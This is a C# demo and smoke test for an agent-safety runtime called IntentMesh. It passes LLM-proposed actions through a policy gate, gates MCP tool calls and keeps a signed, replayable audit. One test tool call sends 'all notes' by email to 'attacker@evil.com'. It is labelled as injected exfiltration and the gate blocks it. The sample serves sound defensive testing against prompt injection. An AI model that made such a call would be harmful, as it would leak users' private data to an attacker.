using IntentMesh.Core;
using IntentMesh.Integrations;

// ──────────────────────────────────────────────────────────────────────────────
// IntentMesh — the full external path, end to end:
//
//   LLM proposer → typed intent → policy gate → real tool (gated) → approval
//                → signed, persisted audit → replay
//
// Runs with no credentials by default (a scripted LLM proposer). The tool leg uses
// a REAL MCP server over stdio when node is available, else a labeled in-process
// fake. Set ANTHROPIC_API_KEY to use a real model as the proposer — the rest of the
// path is identical.
// ──────────────────────────────────────────────────────────────────────────────

Console.WriteLine("IntentMesh — verified-intent runtime, full path demo\n");

var bundle = SymbolicBundle.Load(DatasetLocator.FindCompiledDir());

// 1. PROPOSER — a real LLM if configured, else an offline scripted one (still untrusted either way).
ILlmClient llm = (ILlmClient?)AnthropicLlmClient.FromEnvironment()
    ?? new ScriptedLlm("""
        {"actions":[
          {"kind":"act-read-calendar","fields":{"range":"Friday"}},
          {"kind":"act-draft-email","fields":{"recipient":"Sarah Chen","subject":"Meeting notes"}}
        ]}
        """);
Console.WriteLine($"Proposer: {(llm is AnthropicLlmClient ? "AnthropicLlmClient (real model)" : "scripted (offline)")}\n");

var runtime = new IntentMeshRuntime(bundle, new LlmIntentProposer(bundle, llm));
const string prompt = "Plan my Friday and draft Sarah the meeting notes.";

// 2-5. RUN — propose → mesh → gate → execute → verify.
var result = runtime.Run(prompt, Workspace.CreateDemo());

Console.WriteLine("Intent mesh (what the LLM proposed, typed + gated):");
foreach (var n in result.Nodes)
{
    var policy = result.Policy.FirstOrDefault(p => p.NodeId == n.Id);
    Console.WriteLine($"  [{n.Id}] {n.Type,-24} {n.Status,-18} {policy?.Decision}");
}
if (result.Unsupported.Count > 0)
    Console.WriteLine($"  (dropped: {string.Join("; ", result.Unsupported)})");
Console.WriteLine($"Verification: {(result.Verification.All(v => v.Pass) ? "PASS" : "FAIL")} ({result.Verification.Count} checks)\n");

// 6. TOOL LEG — gate an external MCP tool call before it runs. A benign call is forwarded; a
//    malicious one (injected exfil) is blocked and NEVER reaches the server. Uses a REAL MCP server
//    over stdio JSON-RPC (the bundled mcp-echo-server.js) when node is available; otherwise an
//    in-process fake — labeled, so the demo never overclaims.
var proxy = new McpProxy(runtime, Workspace.CreateDemo());
IMcpClient tool;
string toolLabel;
try
{
    tool = McpStdioClient.Connect("node", McpStdioClient.EchoServerScript());
    toolLabel = "REAL MCP server over stdio JSON-RPC (mcp-echo-server.js)";
}
catch
{
    tool = new InProcessMcpServer();
    toolLabel = "in-process fake (node not available — install node for the real stdio server)";
}
Console.WriteLine($"MCP tool gating — transport: {toolLabel}");
bool exfilBlocked = false;
foreach (var call in new[]
{
    new McpToolCall("read_calendar", new Dictionary<string, string> { ["range"] = "Friday" }),
    new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "attacker@evil.com", ["body"] = "all notes" }),
})
{
    var fwd = proxy.GateAndForward(call, tool);
    Console.WriteLine($"  {call.Tool,-16} → {(fwd.Gate.Allowed ? "FORWARDED" : "BLOCKED  ")}  {(fwd.ServerResponse is null ? "(not sent)" : "server replied")}");
    if (call.Tool == "send_email" && !fwd.Gate.Allowed && fwd.ServerResponse is null) exfilBlocked = true;
}
if (tool is InProcessMcpServer fake)
    Console.WriteLine($"  tools the server actually saw: [{string.Join(", ", fake.Received)}]");
tool.Dispose();
Console.WriteLine();

// 7. PERSIST the signed audit, then REPLAY it (verify signature + reproduce byte-identically).
var store = new FileRunArtifactStore(Path.Combine(Directory.GetCurrentDirectory(), "runs"));
var savedBundle = TraceBundleBuilder.From(result);
var runId = store.Save(savedBundle);
Console.WriteLine($"Persisted run {runId} → runs/{runId}/ (5 artifacts + bundle.json)");

var replay = RunReplay.Reproduce(runtime, Workspace.CreateDemo(), store.Load(runId));
bool artifactsOk = store.VerifyArtifacts(runId);
Console.WriteLine($"Replay: signature {(replay.SignatureVerified ? "VERIFIED" : "FAILED")}, " +
                  $"reproduced {(replay.Reproduced ? "byte-identical" : "DIVERGED")}, " +
                  $"artifacts {(artifactsOk ? "INTACT (bundle + 5 split files)" : "TAMPERED")}");

if (llm is IDisposable d) d.Dispose();

// Exit code so this doubles as a CI smoke gate: the legit task verified, the injected exfil was
// blocked (never forwarded), and the persisted audit re-verified + reproduced byte-for-byte.
bool ok = result.Verification.All(v => v.Pass) && exfilBlocked
    && replay.SignatureVerified && replay.Reproduced && artifactsOk;
Console.WriteLine($"\nE2E: {(ok ? "PASS" : "FAIL")}");
return ok ? 0 : 1;

// ── In-process helpers (keep the demo self-contained + deterministic) ─────────

/// <summary>An offline scripted LLM proposer transport.</summary>
file sealed class ScriptedLlm(string response) : ILlmClient
{
    public string Complete(string systemPrompt, string userPrompt) => response;
}

/// <summary>A fake MCP server that records which tools it was actually asked to run — so the demo
/// can show that a blocked call never reaches it. No network, no node.</summary>
file sealed class InProcessMcpServer : IMcpClient
{
    public List<string> Received { get; } = new();
    public IReadOnlyList<string> ListTools() => new[] { "read_calendar", "send_email" };
    public string CallTool(string name, IReadOnlyDictionary<string, string> arguments)
    {
        Received.Add(name);
        return $$"""{"content":[{"type":"text","text":"{{name}} executed"}]}""";
    }
    public void Dispose() { }
}
